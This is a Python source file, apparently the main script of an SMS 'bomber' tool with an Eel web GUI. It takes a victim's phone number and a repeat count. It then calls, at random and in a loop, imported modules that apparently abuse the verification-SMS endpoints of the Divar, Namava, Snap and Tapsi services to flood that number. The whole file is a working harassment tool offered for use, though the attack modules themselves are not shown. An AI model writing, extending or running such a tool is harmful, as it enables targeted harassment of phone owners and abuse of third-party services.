import eel,requests,time
import time,random
import modules.divarbomber as divar
import modules.namava as namava
import modules.snapbomber as snap
import modules.tapsibomber as tapsi

eel.init("web")
    
@eel.expose
def getinfo(tel , number):
	sendDataJs(tel , number)
	eel.activebutton()

def sendDataJs(tele , num):
	for i in range(int(num)):
		res , app= sender(tele)
		if res == 200:
			eel.getResualt(f"Posted on {tele} from the {app}")
		else:
			eel.getResualt(f"Not sent to {tele} from the {app} | Please check your internet !")
		time.sleep(2)

def sender(tel):
	ch = int(round(random.random()*3))
	if ch == 0:
		app = "Divar"
		res = divar.divar_bomber(tel)
	elif ch == 1: 
		app = "Namava"
		res = namava.namava_bomber(tel)
	elif ch == 2:
		app = "Snap"
		res = snap.snap_bomber(tel)
	elif ch ==3:
		app = "Tapsi"
		res = tapsi.tapsi_bomber(tel)
	
	return res , app


eel.start('index.html', size=(500,650))